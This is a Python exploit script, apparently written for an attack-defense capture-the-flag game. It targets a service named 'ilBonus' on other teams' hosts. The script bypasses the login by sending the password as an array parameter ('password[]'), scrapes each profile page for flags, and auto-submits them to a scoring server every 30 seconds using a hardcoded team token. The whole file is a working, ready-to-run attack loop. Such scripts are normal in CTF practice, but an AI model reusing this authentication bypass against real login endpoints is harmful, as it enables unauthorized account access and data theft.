#/usr/bin/python3

import requests, time, re

TEAM_TOKEN = '21d7214f2de4f6e743364e49196a346d'

chall = "ilBonus"

def exploit(json):
	lista = []
	c = 0
	for ip in json[chall]:
		c += 1
		size = len(json[chall])
		print(f"{c} / {size} ...")
		for username in json[chall][ip]:
			try:
				flag = get(ip, username)
				print(flag)
			except:
				print("ERR")
				continue
			if flag not in lista:
				lista.append(flag)
	return lista
			
	
def get(ip, username):
	session = requests.Session()
	burp0_url = f"http://{ip}:8080/login"
	
	burp0_data = {"email": username, "password[]": "a"}
	resp1 = session.post(burp0_url, data=burp0_data)
	resp2 = session.get(f"http://{ip}:8080/profilo")
	
	#soup = BeautifulSoup(resp2.content, "html.parser")
	#flag = soup.find_all("textarea", class_="form-control")[0].text[:32]
	
	flag = re.findall("[A-Z0-9]{31}=", resp2.text)[0]
	return flag
	




# TEST
# username = "rLLxSL@mail.com"
# flag = get("10.60.85.1", username)
# print(flag)

#OK
while True:
	print("Running exploit...")
	json = requests.get("http://10.10.0.1:8081/flagIds").json()
	flags = exploit(json)
	print(flags)

	print("Putting flags...")
	r = requests.put('http://10.10.0.1:8080/flags', headers={'X-Team-Token': TEAM_TOKEN},json=flags).text
	print(r)
	print("Exploit ok...\nRepeat...")
	print("\n")

	time.sleep(30)




